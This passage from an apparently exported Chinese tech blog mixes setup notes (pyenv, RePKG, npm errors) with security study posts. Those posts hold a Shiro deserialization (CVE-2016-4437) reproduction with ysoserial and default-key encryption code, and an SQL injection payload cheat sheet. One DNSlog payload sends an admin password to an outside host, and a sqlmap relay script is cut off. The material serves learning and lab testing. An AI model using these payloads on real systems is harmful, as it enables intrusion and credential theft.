<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# which virtualenv-init</span><br><span class="line">/usr/bin/which: no virtualenv-init in (/root/.pyenv/shims:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin)</span><br><span class="line"></span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# which pyenv</span><br><span class="line">pyenv ()</span><br><span class="line">&#123; </span><br><span class="line">    local command;</span><br><span class="line">    command=&quot;$&#123;1:-&#125;&quot;;</span><br><span class="line">    if [ &quot;$#&quot; -gt 0 ]; then</span><br><span class="line">        shift;</span><br><span class="line">    fi;</span><br><span class="line">    case &quot;$command&quot; in </span><br><span class="line">        activate | deactivate | rehash | shell)</span><br><span class="line">            eval &quot;$(pyenv &quot;sh-$command&quot; &quot;$@&quot;)&quot;</span><br><span class="line">        ;;</span><br><span class="line">        *)</span><br><span class="line">            command pyenv &quot;$command&quot; &quot;$@&quot;</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="安装编译环境和依赖工具"><a href="#安装编译环境和依赖工具" class="headerlink" title="安装编译环境和依赖工具"></a>安装编译环境和依赖工具</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# sudo yum -y groupinstall &quot;Development Tools&quot;</span><br><span class="line">/usr/lib/python3.6/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography. The next release of cryptography will remove support for Python 3.6.</span><br><span class="line">  from cryptography import x509</span><br><span class="line"></span><br><span class="line">Failed loading plugin &quot;spacewalk&quot;: module &#x27;lib&#x27; has no attribute &#x27;X509_V_FLAG_CB_ISSUER_CHECK&#x27;</span><br><span class="line">Last metadata expiration check: 2:54:19 ago on Wed 10 Jul 2024 05:25:19 PM CST.</span><br><span class="line">Dependencies resolved.</span><br></pre></td></tr></table></figure>

<h1 id="安装python环境"><a href="#安装python环境" class="headerlink" title="安装python环境"></a>安装python环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# pyenv install 3.10.0</span><br><span class="line">WARNING: Please make sure you remove any previous custom paths from your /root/.pydistutils.cfg file.</span><br><span class="line">Installing Python-3.10.0...</span><br><span class="line">patching file aclocal.m4</span><br><span class="line">patching file configure</span><br><span class="line">Hunk #5 succeeded at 10537 (offset -15 lines).</span><br><span class="line">patching file Misc/NEWS.d/next/Build/2021-10-11-16-27-38.bpo-45405.iSfdW5.rst</span><br><span class="line">patching file configure</span><br><span class="line">patching file configure.ac</span><br><span class="line">Installed Python-3.10.0 to /root/.pyenv/versions/3.10.0</span><br></pre></td></tr></table></figure>
<h1 id="设置为全局"><a href="#设置为全局" class="headerlink" title="设置为全局"></a>设置为全局</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# pyenv global 3.10.0</span><br></pre></td></tr></table></figure>
<h1 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# python -V</span><br><span class="line">Python 3.10.0</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>pyenv</tag>
      </tags>
  </entry>
  <entry>
    <title>repkg简单使用</title>
    <url>/posts/48e66d44.html</url>
    <content><![CDATA[<h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><p>提取PKG文件<br>将PKG转换为壁纸引擎项目<br>将TEX转换为图像<br>转储包装&#x2F;TEX信息</p>
<h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><h2 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h2><p>extract -参数 从文件夹中提取指定PKG&#x2F;TEX文件</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>全称</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>-o</td>
<td>--output</td>
<td>(默认值: .&#x2F;output)输出目录</td>
</tr>
<tr>
<td>-i</td>
<td>--ignoreexts</td>
<td>不提取具有指定扩展名的文件 (用逗号 “，” 分隔)</td>
</tr>
<tr>
<td>-e</td>
<td>--onlyexts</td>
<td>仅提取具有指定扩展名的文件 (用逗号 “，” 分隔)</td>
</tr>
<tr>
<td>-d</td>
<td>--debuginfo</td>
<td>在提取&#x2F;反编译时打印调试信息</td>
</tr>
<tr>
<td>-t</td>
<td>--tex</td>
<td>将所有TEX文件转换为输入中指定目录中的图像</td>
</tr>
<tr>
<td>-s</td>
<td>--singledir</td>
<td>应该将所有提取的文件放在一个目录中，而不是它们的条目路径</td>
</tr>
<tr>
<td>-r</td>
<td>--recursive</td>
<td>指定目录的所有子文件夹中的递归递归搜索</td>
</tr>
<tr>
<td>-c</td>
<td>--copyproject</td>
<td>从PKG中将project.json和preview.jpg从PKG复制到输出目录</td>
</tr>
<tr>
<td>-n</td>
<td>--usename</td>
<td>使用project.json中的名称作为项目子文件夹名称，而不是id</td>
</tr>
<tr>
<td></td>
<td>--no-tex-convert</td>
<td>在提取PKG时不要将TEX文件转换为图像</td>
</tr>
<tr>
<td></td>
<td>--overwrite</td>
<td>覆盖覆盖所有现有文件</td>
</tr>
</tbody></table>
<h2 id="info"><a href="#info" class="headerlink" title="info"></a>info</h2><p>info -参数 提取pkg&#x2F;tex信息</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>全称</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>-s</td>
<td>--sort</td>
<td>排序条目a-z</td>
</tr>
<tr>
<td>-b</td>
<td>--sortby</td>
<td>(默认值: name) 排序依据…(可用选项: 名称、扩展名、大小)</td>
</tr>
<tr>
<td>-t</td>
<td>--tex</td>
<td>转储有关指定目录中所有TEX文件的信息</td>
</tr>
<tr>
<td>-p</td>
<td>--projectinfo</td>
<td>要从project.json转储的键 (使用逗号分隔) (* 表示全部)</td>
</tr>
<tr>
<td>-e</td>
<td>--printentries</td>
<td>打印包中的条目</td>
</tr>
<tr>
<td></td>
<td>--title-filter</td>
<td>标题过滤器</td>
</tr>
</tbody></table>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>只需提取PKG和TEX转换为图像输出文件夹中创建的当前目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">repkg extract E:\Games\steamapps\workshop\content\123\scene.pkg</span><br></pre></td></tr></table></figure>
<p>在指定目录的子文件夹中查找PKG文件，并在输出目录中将壁纸引擎项目从其中删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">repkg extract -c E:\Games\steamapps\workshop\content\123</span><br></pre></td></tr></table></figure>
<p>在指定目录的子文件夹中查找PKG文件，仅将TEX条目转换为png，然后将它们放入。&#x2F;output从PKG中省略它们的路径:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">repkg extract -e tex -s -o ./output E:\Games\steamapps\workshop\content\123</span><br></pre></td></tr></table></figure>
<p>将所有TEX文件转换为特定文件夹中的图像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">repkg extract -t -s E:\path\to\dir\with\tex\files</span><br></pre></td></tr></table></figure>

<h1 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h1><p>打开想要提取的壁纸<br><img src="/img/repkg/wallpaper.png"><br>在pkg文件夹下创建output文件夹，将scene.pkg文件复制一份到repkg目录下使用如下命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RePKG.exe extract -n scene.pkg -o output</span><br></pre></td></tr></table></figure>
<p>在output&#x2F;壁纸名&#x2F;materials下找到壁纸:<br><img src="/img/repkg/paper.png"></p>
]]></content>
      <categories>
        <category>图像工具</category>
      </categories>
      <tags>
        <tag>PKG文件提取</tag>
      </tags>
  </entry>
  <entry>
    <title>npm更新报错</title>
    <url>/posts/63beea23.html</url>
    <content><![CDATA[<h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p>1.更新npm可能node版本不一致，导致命令无法使用<br>2.在 <a href="https://nodejs.org/zh-cn/download/releases/">https://nodejs.org/zh-cn/download/releases/</a> 内可查看node对应的npm版本<br>3.npm -g install npm @npm 安装指定npm版本号<br>4.若出现报错说明npm存在旧的npm缓存，或旧的npm环境，需将之前C盘Roaming下的npm，npm-cache两个文件删除<br>5.删除之后重新执行npm -g install npm @npm版本号<br>6.再次查看npm版本确认是否更换完成</p>
<h1 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Daiyamondo&gt;npm install -g npm</span><br><span class="line">npm ERR! code EBADENGINE</span><br><span class="line">npm ERR! engine Unsupported engine</span><br><span class="line">npm ERR! engine Not compatible with your version of node/npm: npm@10.9.0</span><br><span class="line">npm ERR! notsup Not compatible with your version of node/npm: npm@10.9.0</span><br><span class="line">npm ERR! notsup Required: &#123;&quot;node&quot;:&quot;^18.17.0 || &gt;=20.5.0&quot;&#125;</span><br><span class="line">npm ERR! notsup Actual:   &#123;&quot;npm&quot;:&quot;8.1.2&quot;,&quot;node&quot;:&quot;v16.13.1&quot;&#125;</span><br><span class="line"></span><br><span class="line">npm ERR! A complete log of this run can be found in:</span><br><span class="line">npm ERR!     C:\Users\Daiyamondo\AppData\Local\npm-cache\_logs\2024-10-24T06_31_00_310Z-debug.log</span><br></pre></td></tr></table></figure>
<h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Daiyamondo&gt;,npm install --force -g npm</span><br><span class="line">npm WARN using --force Recommended protections disabled.</span><br><span class="line">npm WARN install Forcing global npm install with incompatible version 10.9.0 into node v16.13.1</span><br><span class="line"></span><br><span class="line">added 3 packages in 5s</span><br><span class="line"></span><br><span class="line">3 packages are looking for funding</span><br><span class="line">  run `npm fund` for details</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>报错</category>
      </categories>
      <tags>
        <tag>npm报错</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro反序列化漏洞(CVE-2016-4437)复现</title>
    <url>/posts/79c4731b.html</url>
    <content><![CDATA[<p>摘:<a href="https://blog.csdn.net/dreamthe/article/details/124390531">https://blog.csdn.net/dreamthe/article/details/124390531</a></p>
<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Apache Shiro 框架提供了记住密码（RememberMe）的功能，用户登录成功后会将用户信息加密，加密过程:用户信息&#x3D;&gt;序列化 &#x3D;&gt; AES加密 &#x3D;&gt;base64编码&#x3D;&gt; RememberMe Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的rememberMe字段里面，在服务端收到请求对rememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本&lt;&#x3D;1.2.4中使用了默认密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，更容易触发 RCE 漏洞。</p>
<p>所以我们Payload产生的过程：<br>命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie 值</p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>shiro版本 &lt;&#x3D; 1.2.4</p>
<h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><p>未登录的情况下，请求包的 cookie 中没有 remember Me字段，返回包 set-Cookie 里也没有 deleteMe 字段。<br>登录失败的话，不管有没有勾选RememberMe字段，返回包都会有 rememberMe&#x3D; deleteMe 字段。<br>不勾选 RememberMe，登录成功的话，返回包 set-Cookie 里有 rememberMe &#x3D; deleteMe 字段。但是之后的所有请求中 Cookie 都不会有 RememberMe 字段。<br>勾选 RememberMe，登录成功的话，返回包set-Cookie里有rememberMe&#x3D;deleteMe字段，还会有remember 字段，之后的所有请求中Cookie都会有rememberMe字段。<br>或者可以在 cookie 后面自己加一个 rememberMe &#x3D; 1,看返回包有没有rememberMe&#x3D; deleteMe。</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h1 id="扩展学习（待学习……）"><a href="#扩展学习（待学习……）" class="headerlink" title="扩展学习（待学习……）"></a>扩展学习（待学习……）</h1><h1 id="3修复建议"><a href="#3修复建议" class="headerlink" title="3修复建议"></a>3修复建议</h1><h1 id="Vulhub"><a href="#Vulhub" class="headerlink" title="Vulhub"></a>Vulhub</h1><h1 id="Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）"><a href="#Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）" class="headerlink" title="Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）"></a>Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</h1><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。<br>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>
<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动一个使用了Apache Shiro 1.2.4的Web服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>服务启动后，访问<code>http://your-ip:8080</code>可使用<code>admin:vulhub</code>进行登录。</p>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用ysoserial生成CommonsBeanutils1的Gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>
<p>使用Shiro内置的默认密钥对Payload进行加密：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java</span><br><span class="line">package org.vulhub.shirodemo;</span><br><span class="line">import org.apache.shiro.crypto.AesCipherService;</span><br><span class="line">import org.apache.shiro.codec.CodecSupport;</span><br><span class="line">import org.apache.shiro.util.ByteSource;</span><br><span class="line">import org.apache.shiro.codec.Base64;</span><br><span class="line">import org.apache.shiro.io.DefaultSerializer;</span><br><span class="line">import java.nio.file.FileSystems;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">public class TestRemember &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(&quot;/path&quot;, &quot;to&quot;, &quot;poc.ser&quot;));</span><br><span class="line">        AesCipherService aes = new AesCipherService();</span><br><span class="line">        byte[] key = Base64.decode(CodecSupport.toBytes(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;));</span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发送rememberMe Cookie，即可成功执行<code>touch /tmp/success</code>：</p>
<p>待补充……</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>shiro反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入知识记录</title>
    <url>/posts/ccd55f3a.html</url>
    <content><![CDATA[<h1 id="sql注入漏洞基本原理"><a href="#sql注入漏洞基本原理" class="headerlink" title="sql注入漏洞基本原理"></a>sql注入漏洞基本原理</h1><p>Web应用程序对用户输入的数据校验处理不严或者根本没有校验，致使用户可以拼接执行SQL命令。<br>可能导致数据泄露或数据破坏，缺乏可审计性，甚至导致完全接管主机。</p>
<h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><p>根据注入技术分类有以下五种：</p>
<div class="note info no-icon flat"><p>布尔型盲注：根据返回页面判断条件真假</p>
<p>时间型盲注：用页面返回时间是否增加判断是否存在注入</p>
<p>基于错误的注入：页面会返回错误信息</p>
<p>联合查询注入：可以使用union的情况下</p>
<p>堆查询注入：可以同时执行多条语句</p>
</div>

<p>根据数据获取分类有以下三种：</p>
<div class="note info no-icon flat"><p>inband<br>利用Web应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。</p>
<p>inference<br>通过Web的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注， 通过web应用的其他改变来推断数据。</p>
<p>out of band (OOB)<br>通过其他传输方式来获得数据，比如DNS解析协议和电子邮件，如dnslog注入</p>
</div>



<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>使用参数化查询。</p>
<p>数据库服务器不会把参数的内容当作SQL指令的一部分来拼接执行；</p>
<p>而是在数据库完成SQL指令的编译后才套用参数运行(预编译)。</p>
<p>避免数据变成代码被执行，时刻分清代码和数据的界限。</p>
<h1 id="mysql基础知识"><a href="#mysql基础知识" class="headerlink" title="mysql基础知识"></a>mysql基础知识</h1><p>MySQL默认的数据库有<br>sys、mysql、performance_schema、information_schema；<br>information_schema存放着所有的数据库信息(5.0版本以上才有这个库)<br>这个库有三个表：</p>
<div class="note info no-icon flat"><p>SCHEMATA 该表存放用户创建的所有数据库库名<br>SCHEMA_NAME 字段记录数据库库名<br>TABLES 该表存放用户创建的所有数据库库名和表名<br>TABLE_SCHEMA 字段记录数据库名<br>TABLE_NAME 字段记录表名<br>COLUMNS 该表存放用户创建的所有数据库库名、表名和字段名<br>TABLE_SCHEMA 字段记录数据库名<br>TABLE_NAME 字段记录表名<br>COLUMN_NAME 字段记录字段名</p>
</div>

<h1 id="sql注入漏洞查找"><a href="#sql注入漏洞查找" class="headerlink" title="sql注入漏洞查找"></a>sql注入漏洞查找</h1><h2 id="常见注入点"><a href="#常见注入点" class="headerlink" title="常见注入点"></a>常见注入点</h2><p>GET&#x2F;POST&#x2F;PUT&#x2F;DELETE参数<br>X-Forwarded-For<br>文件名</p>
<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### 字符型不一定单引号闭合，可能单引号，双引号，括号排列组合</span><br><span class="line">字符型</span><br><span class="line">?id=1&#x27;		页面返回正常</span><br><span class="line">?id=1 		页面返回不正常</span><br><span class="line"></span><br><span class="line">### 数字型</span><br><span class="line">?id=1 and 1=1		页面返回正常</span><br><span class="line">?id=1 and 1=2		页面返回不正常</span><br></pre></td></tr></table></figure>

<h2 id="测试列数"><a href="#测试列数" class="headerlink" title="测试列数"></a>测试列数</h2><p>以数字型举例  列数为四</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 order by2	--+返回正常</span><br><span class="line">?id=1 order by 3#			--返回正常</span><br><span class="line">?id=1 order by 4#			--返回正常</span><br><span class="line">?id=1 order by 5#			--返回错误</span><br></pre></td></tr></table></figure>
<h1 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h1><h2 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,3,CONCAT_WS(CHAR(32,58,32),user(),database(),version())#</span><br></pre></td></tr></table></figure>
<h2 id="获取表信息"><a href="#获取表信息" class="headerlink" title="获取表信息"></a>获取表信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,3,table_name from information_schema.tables where table_schema=&#x27;db_name&#x27; limit 0,1#</span><br></pre></td></tr></table></figure>
<h2 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,3,column_name from information_schema.columns where table_schema=%27数据库名%27 and table_name=%27表名%27limit 0,1#</span><br></pre></td></tr></table></figure>
<h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,group_concat(name,password) from column_name#</span><br></pre></td></tr></table></figure>




<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>判断是否存在报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1/0</span><br></pre></td></tr></table></figure>
<h2 id="基于主键冲突报错"><a href="#基于主键冲突报错" class="headerlink" title="基于主键冲突报错"></a>基于主键冲突报错</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a</span><br></pre></td></tr></table></figure>
<h2 id="xpath路径报错"><a href="#xpath路径报错" class="headerlink" title="xpath路径报错"></a>xpath路径报错</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1, concat(0x5c,(select user())))</span><br><span class="line">updatexml(0x3a,concat(1,(select user())),1)</span><br><span class="line">exp(~(SELECT * from(select user())a))</span><br></pre></td></tr></table></figure>

<h2 id="GTID-SUBSET-GTID-SUBTRACT-暂未尝试"><a href="#GTID-SUBSET-GTID-SUBTRACT-暂未尝试" class="headerlink" title="GTID_SUBSET &amp;&amp; GTID_SUBTRACT(暂未尝试)"></a>GTID_SUBSET &amp;&amp; GTID_SUBTRACT(暂未尝试)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GTID_SUBSET(version(), 1)</span><br><span class="line">GTID_SUBSET</span><br><span class="line">?id=1&#x27;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br><span class="line">GTID_SUBTRACT</span><br><span class="line">?id=1&#x27;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>页面无查询信息数据返回，通过页面响应判断是否存在注入<br>以下手工测试数量过于麻烦，可配合bp的intruder模块爆破</p>
<p>判断数据库名长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+</span><br><span class="line">1&#x27;and length(database())&gt;=13--+</span><br><span class="line">1&#x27;and length(database())&gt;=14--+</span><br></pre></td></tr></table></figure>

<h2 id="猜测数据库名"><a href="#猜测数据库名" class="headerlink" title="猜测数据库名"></a>猜测数据库名</h2><p>使用逐字符判断的方式获取数据库名；<br>数据库名的范围一般在a<del>z、0</del>9之内，可能还会有特殊字符 “_”、”-“ 等，这里的字母不区分大小写。<br>substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and substr(database(),1,1)=&#x27;a&#x27;--+</span><br><span class="line">&#x27; and substr(database(),2,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
<p>也可以使用ascii码判断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>

<h2 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h2><p>修改1,1前边的1到20，逐字符猜解出第一个字段的名<br>修改limit的0,1前边的0到20，逐个猜解每个字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
<h2 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and substr((select 字段名 from 表名 limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>

<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>盲注是在SQL注入攻击过程中，服务器关闭了错误回显，单纯通过服务器返回内容的变化来判断是否存在SQL注入的方式 。<br>可以用benchmark，sleep等造成延时效果的函数。<br>如果benkchmark和sleep关键字被过滤了，可以让两个非常大的数据表做笛卡尔积 (opens new window)产生大量的计算从而产生时间延迟；<br>或者利用复杂的正则表达式去匹配一个超长字符串来产生时间延迟。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and sleep(5) and 1=1--+	页面返回不正常，延时5秒</span><br><span class="line">&#x27; and sleep(5) and 1=2--+	页面返回不正常，不延时</span><br><span class="line"></span><br><span class="line">and if(length(database())&gt;1,sleep(5),1)</span><br></pre></td></tr></table></figure>

<h2 id="获取数据-2"><a href="#获取数据-2" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and if(substr(database(),1,1)=&#x27;a&#x27;,sleep(5),1)--+</span><br></pre></td></tr></table></figure>

<h1 id="DNSlog盲注"><a href="#DNSlog盲注" class="headerlink" title="DNSlog盲注"></a>DNSlog盲注</h1><p>DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息；<br>DNSlog就是记录用户访问网站域名时，记录DNS和对应的IP的转换访问日志；<br>MySQL Load_File()函数可以发起请求，使用Dnslog接收请求，获取数据；<br>通过SQL执行后，将内容输出到DNSlog中记录起来，然后我们可以在DNSlog平台查询回显数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,load_file(CONCAT(&#x27;\\&#x27;,(SELECT hex(pass) FROM user WHERE name=&#x27;admin&#x27; LIMIT 1),&#x27;.mysql.wintrysec.ceye.io\abc&#x27;))</span><br><span class="line">--Hex编码的目的是减少干扰，域名有一定的规范，有些特殊字符不能带入</span><br></pre></td></tr></table></figure>
<h1 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h1><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>注入的参数被加密，使用sqlmap的tamper脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://xxx.com/?id=MQ== --tamper base64encode.py --dbs</span><br></pre></td></tr></table></figure>

<h1 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h1><h2 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h2><p>若参数名也被加密，比如受害者网站URL注入点是经过编码的，不能直接结合sqlmap进行漏洞利用，所以本地搭建一个网站，写一个php脚本编码文件，就可以结合sqlmap工具进行测试。<br>因为，注入点经过复杂编码之后，就不能直接结合sqlmap进行漏洞攻击了。或者sqlmap自己编写tamper脚本进行攻击</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>1.sqlmap注入本地搭建的服务器中转脚本<br>2.中转脚本接收sqlmap注入过来的payload,根据配置进行编码<br>3.将payload与目标地址进行拼接请求该URL</p>
<h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">set_time_limit(0); </span><br><span class="line">$id=$_GET[&quot;id&quot;]; 	//自定义使用base64_encode编码</span><br><span class="line">$id=str_replace(&quot; &quot;,&quot;%20&quot;,$id); </span><br><span class="line">$id=str_replace(&quot;=&quot;,&quot;%3D&quot;,$id); </span><br><span class="line">$url = &quot;http://xxxx?&amp;daxxtae=null&amp;parame=$id&quot;;</span><br><span class="line">echo $url;</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, &quot;$url&quot;); </span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); //https请求 不验证hosts</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 函数执行如果成功只将结果返回，不自动输出任何内容。如果失败返回FALSE</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_PROXY, &#x27;proxy.xxxx.com&#x27;); //代理服务器地址,vps可以不加</span><br><span class="line">curl_setopt($ch, CURLOPT_PROXYPORT, &#x27;8080&#x27;); //代理服务器端口,vps可以不加</span><br><span class="line">$output = curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span 